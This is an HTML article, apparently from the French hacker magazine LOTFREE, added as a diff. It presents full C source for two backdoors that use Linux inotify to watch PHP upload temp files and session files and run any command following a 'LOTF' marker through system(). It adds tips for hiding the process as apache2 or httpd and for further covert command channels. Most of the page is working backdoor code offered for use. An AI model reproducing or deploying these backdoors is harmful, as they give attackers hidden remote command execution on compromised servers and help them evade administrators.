@@ -1,0 +1,315 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href="css/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="css/shThemeDefault.css" rel="stylesheet" type="text/css" />
+  </head>
+
+  <body>
+    <div id="head">LOTFREE Magazine numéro 9</div>
+    <div id="foot"><span style="float: left;"><br />Lancez la radio, cliquez ici : </span><a href="#" onclick="window.open('player.html', 'Player', 'toolbar=0,status=0,location=0,menubar=0,resizable=0,width=175,height=35')"><img src="icon.png" /></a></div>
+    <div id="left">
+      <dl>
+        <dt><strong>Welcome to your inbox Hacker !</strong></dt>
+        <dd>Directories :</dd>
+        <dt><a id="inbox" class="nav" href="inbox.html"> Inbox</a></dt>
+        <dd>One for the money</dd>
+        <dt><a id="drafts" class="nav" href="drafts.html">Drafts</a></dt>
+        <dd>Two for the show</dd>
+        <dt><a id="sent" class="nav" href="sent.html">Sent</a></dt>
+        <dd>Three to get ready</dd>
+        <dt><a id="spam" class="nav" href="spam.html">Spam</a></dt>
+        <dd>And four to go</dd>
+        <dt><a id="trash" class="nav" href="trash.html">Trash</a></dt>
+        <dd>Enjoy ;-)</dd>
+      </dl>
+    </div>
+
+    <div id="content">
+    <p><strong>2 backdoors basées sur PHP et inotify</strong></p>
+
+    <p>Via <a href="http://d4n3ws.polux-hosting.com/2011/09/08/lfi-with-phpinfo-assistance/">une info sur d4n3wS</a> nous avions relayé la découverte d'une technique pour exploiter plus facilement une faille include (ou require) PHP en se basant sur un script phpinfo. <a href="http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf">Le whitepaper</a> de <em>Insomnia Security</em> expliquait en effet que chaque fois qu'on upload un fichier vers un script PHP, quelque soit le contenu du script, le système PHP stocke temporairement le fichier uploadé sur le serveur. Utilisé conjoitement, un script phpinfo présent sur le serveur facilite grandement l'exploitation d'un include local puisque dans les variables d'environnement il indiquera le path du fichier stocké temporairement.</p>
+
+    <p>La mise en oeuvre de cette exploitation n'est pas le sujet de cet article mais ce fonctionnement nous a donné l'idée d'une backdoor fonctionnant sur ce principe : puisqu'on peut envoyer des données sur le serveur aussi facilement (pour peu qu'il utilise PHP), pourquoi ne pas utiliser ce canal pour balancer des commandes ? :)<br />
+    En plus c'est l'occasion d'utiliser les fonctions inotify introduites dans la version 2.6.13 du kernel Linux. Ces fonctions permettent d'être notifié des modifications sur le système de fichier comme des créations, suppressions ou renommages de fichiers.</p>
+
+    <p>Notre 1ère backdoor va surveiller tous les fichiers présents dans /tmp (là où les fichiers uploadés sont placés temporairement) et regarder s'il n'y a pas de création de fichier dont le nom commence par php (là encore c'est la config par défaut de php qui donne des noms du type phpXXXXXXX...). Plus précisemment on va filtrer les évènements du type fermeture d'un fichier après son écriture et intervenir à ce moment là.</p>
+
+    <p>Il y a plusieurs problèmes avec ce type de backdoor qui en feront peut-être plus un PoC qu'une porte dérobée prête à l'utilisation :</p>
+    <ul>
+      <li>Le processus de création, d'écriture et de suppression des fichiers par PHP va très vite. Comme les fichiers uploadés ne sont pas repris par PHP avec <em>move_uploaded_file</em>, les fichiers sont immédiatement supprimés. Ca va tellement vite que les données (buffer) placées par l'OS dans le fichier temporaire n'ont pas le temps d'être synchronisés avant que le fichier soit supprimé... Exemple : si on fait un link() (opération très rapide) du fichier pour que l'inode soit accessible sous un autre nom et que le fichier reste sur le système, on s'apperçoit que pour un fichier de 6Mo, seulement 30Ko ont été réellement écris sur le disque</li>
+      <li>Deuxièmement, les fichiers temporaires ont des droits de lecture/écriture pour wwwrun (process d'Apache) uniquement</li>
+    </ul>
+
+    <p>Pour que notre système fonctionne il faudra donc que la backdoor tourne en tant que wwwrun ou root. Il faudra uploader de gros fichiers pour obtenir quelque chose de récupérable (6Mo semble être une bonne quantité acceptée par défaut sous Apache). Il faudra vite placer un lock sur le fichier afin de lire le peu de données dispos avant la suppression.<br />
+    C'est ce que s'occupe de faire <a href="../data/inotifybd/upload_watch.c">le code</a> qui suit :)</p>
+<pre class="brush: cpp">/* LOTFREE inotify / PHP upload Backdoor */
+#define _BSD_SOURCE
+#include &lt;sys/select.h&gt;
+#include &lt;sys/inotify.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+
+/**
+ * gcc -o upload_watch upload_watch.c -lpthread -O2 -Wall -W -Werror -ansi -pedantic
+ **/
+
+int fd, wd;
+
+void * lire_fichier(void *fichier)
+{
+  char buff[2048];
+  int cnt;
+  int fdesc;
+  struct flock lock;
+  char *cmd;
+
+  fdesc = open((char*)fichier, O_RDONLY);
+  if(fdesc&lt;1)
+    pthread_exit(NULL);
+
+  memset(&amp;lock, 0, sizeof(lock));
+  lock.l_type = F_RDLCK;
+  lock.l_whence = SEEK_SET;
+  lock.l_start = 0;
+  lock.l_len = 2048;
+
+  if(fcntl(fdesc, F_SETLKW, &amp;lock) != -1)
+  {
+    /* On s'en tient a 2048 octets */
+    cnt = read(fdesc, buff, 2048);
+    if(cnt&gt;4)
+    {
+      buff[cnt]='\0';
+      /* Si le contenu commence par LOTF */
+      if(!strncmp(buff, &quot;LOTF&quot;, 4))
+      {
+        cmd = buff + 4;
+        /* On execute ce qui suit */
+        system(cmd);
+      }
+    }
+
+    lock.l_type = F_UNLCK;
+    if(fcntl(fdesc, F_SETLK, &amp;lock) == -1)
+    {
+      printf(&quot;fcntl set err\n&quot;);
+    }
+  }
+  close(fdesc);
+  pthread_exit(NULL);
+}
+
+int main(void)
+{
+    size_t r;
+    fd_set fds;
+    char buffer[8192];
+    struct inotify_event *event;
+    pthread_t monthread;
+
+    /* Initialisation d'inotify */
+    fd = inotify_init();
+    if (fd &lt; 0) {
+        perror(&quot;inotify_init&quot;);
+        return EXIT_FAILURE;
+    }
+
+    /* Surveillance du répertoire /tmp et ses fichiers
+     * On accepte tous les évènements possibles */
+    wd = inotify_add_watch(fd, &quot;/tmp&quot;, IN_ALL_EVENTS);
+    if (wd &lt; 0) {
+        perror(&quot;inotify_add_watch&quot;);
+        return EXIT_FAILURE;
+    }
+
+    if(daemon(1,0) &lt; 0)
+    {
+        perror(&quot;daemon&quot;);
+        return EXIT_FAILURE;
+    }
+
+    while (1) {
+        FD_ZERO(&amp;fds);
+        FD_SET(fd, &amp;fds);
+        if (select(fd + 1, &amp;fds, NULL, NULL, 0) &lt;= 0) {
+            continue;
+        }
+
+        r = read(fd, buffer, sizeof(buffer));
+        if (r &lt;= 0) {
+            perror(&quot;read&quot;);
+            return EXIT_FAILURE;
+        }
+
+        event = (struct inotify_event *) buffer;
+
+        /* Le nom des fichiers uploades commence normalement par php */
+        if (event-&gt;len &gt; 3) {
+            if(!strncmp(event-&gt;name, &quot;php&quot;, 3))
+            {
+                /* On intercepte a la fermeture du fichier */
+                if(event-&gt;mask &amp; IN_CLOSE_WRITE)
+                {
+                    pthread_create(&amp;monthread, NULL, lire_fichier, (void *)event-&gt;name);
+                }
+            }
+        }
+    }
+
+    pthread_exit(NULL);
+    return EXIT_FAILURE;
+}
+</pre>
+
+<p>Notre <a href="../data/inotifybd/session_watch.c">seconde backdoor</a> se base aussi sur PHP et inotify mais cette fois on ne s'occupe pas des fichiers temporaires d'upload mais des fichiers de session (cookies) stockés sur le serveur par PHP.</p>
+
+<p>Les circonstances sont différentes : les fichiers sont moins temporaires et de taille plus petite. L'accès aux données présents dans ces fichiers est moins évident puisqu'il faut savoir quelles données sont stockées dans les sessions de l'appli PHP présente sur le serveur. Donc ça suppose que vous ayez accès au code source de l'appli (en cherchant des trucs du style $_SESSION['truc'] = <em>données que vous contrôlez</em>) ou que vous trouviez par déduction ou énumération...</p>
+
+<p>Le path des fichiers de session est défini dans le php.ini par la variable session.save_path et sa valeur est généralement &quot;/var/lib/php5&quot; par défaut. Là encore il faut des droits wwwrun ou root.</p>
+
+<pre class="brush: cpp">/* LOTFREE inotify PHP session backdoor */
+#define _BSD_SOURCE
+#include &lt;sys/select.h&gt;
+#include &lt;sys/inotify.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+
+/**
+ * gcc -o session_watch session_watch.c -lpthread -O2 -Wall -W -Werror -ansi -pedantic
+ **/
+
+#define SESSION_PATH &quot;/var/lib/php5/&quot;
+
+int fd, wd;
+
+void * lire_fichier(void *fichier)
+{
+  char buff[4096];
+  int cnt;
+  int fdesc;
+  char *cmd;
+  char *end;
+  char *sess_path;
+
+
+  cnt = strlen(SESSION_PATH) + strlen((char*)fichier);
+  sess_path = (char*)malloc(cnt + 1);
+  strcpy(sess_path, SESSION_PATH);
+  strcat(sess_path, fichier);
+
+  fdesc = open(sess_path, O_RDONLY);
+  if(fdesc &lt; 1)
+  {
+    free(sess_path);
+    pthread_exit(NULL);
+  }
+
+
+  cnt = read(fdesc, buff, 4095);
+  /* Il faut au moins 6 octets : LOTF*! */
+  if (cnt &gt; 5)
+  {
+    buff[cnt] = '\0';
+    /* debut de la commande : LOTF */
+    cmd = strstr(buff, &quot;LOTF&quot;);
+    if(cmd != NULL)
+    {
+      cmd += 4;
+      /* se termine par ! */
+      end = strchr(cmd, 33); /* 33 = '!' */
+      if(end != NULL)
+      {
+        end[0] = '\0';
+        /* on execute */
+        system(cmd);
+      }
+    }
+  }
+  close(fdesc);
+  free(sess_path);
+  pthread_exit(NULL);
+}
+
+int main(void)
+{
+    size_t r;
+    fd_set fds;
+    char buffer[8192];
+    struct inotify_event *event;
+    pthread_t monthread;
+
+    /* Initialisation d'inotify */
+    fd = inotify_init();
+    if (fd &lt; 0) {
+        perror(&quot;inotify_init&quot;);
+        return EXIT_FAILURE;
+    }
+
+    /* Surveillance du répertoire contenant les fichiers de session
+     * On accepte tous les évènements possibles */
+    wd = inotify_add_watch(fd, SESSION_PATH, IN_ALL_EVENTS);
+    if (wd &lt; 0) {
+        perror(&quot;inotify_add_watch&quot;);
+        return EXIT_FAILURE;
+    }
+
+    if(daemon(1,0)&lt; 0)
+    {
+        perror(&quot;daemon&quot;);
+        return EXIT_FAILURE;
+    }
+
+    while (1) {
+        FD_ZERO(&amp;fds);
+        FD_SET(fd, &amp;fds);
+        if (select(fd + 1, &amp;fds, NULL, NULL, 0) &lt;= 0) {
+            continue;
+        }
+
+        r = read(fd, buffer, sizeof(buffer));
+        if (r &lt;= 0) {
+            perror(&quot;read&quot;);
+            return EXIT_FAILURE;
+        }
+
+        event = (struct inotify_event *) buffer;
+
+        /* les fichiers sont habituellement du type &quot;sess_etc.....&quot; */
+        if((event-&gt;len &gt; 5) &amp;&amp; (event-&gt;mask &amp; IN_CLOSE_WRITE))
+        {
+            pthread_create(&amp;monthread, NULL, lire_fichier, (void *)event-&gt;name);
+        }
+    }
+
+    pthread_exit(NULL);
+    return EXIT_FAILURE;
+}</pre>
+<p>L'utilisation de ces backdoors peut-être difficile à mettre en oeuvre mais a toutefois un avantage : un admin qui pense être piraté ou qui vérifie juste son système cherchera plutôt des fichiers PHP suspects sur son serveur web, des ports en écoute ou des connexions sortantes vers des serveurs IRC... mais probablement pas un système de ce type. Pour peu que vous cachiez bien le processus (comme il est censé tourner en wwwrun, autant nommer l'exe apache2 ou httpd)</p>
+
+<p>On vous donne quelques autres idées de fichiers sur lesquels peuvent se baser des backdoors inotify : logs apaches et logs sql (laissent des traces), spool mails (peut être sympa), ftp public (facile à mettre en oeuvre) ou partages samba/nfs, spool d'impression (nécessite probablement en accès réseau local) ou un syslog distant (/var/log/message) sur lequel on enverrait des commandes via logger ou netcat.</p>
+    </div>
+<script language="javascript" src="js/shCore.js"></script>
+<script language="javascript" src="js/shBrushCpp.js"></script>
+<script type="text/javascript">
+  SyntaxHighlighter.all()
+</script>
+  </body>
+</html>
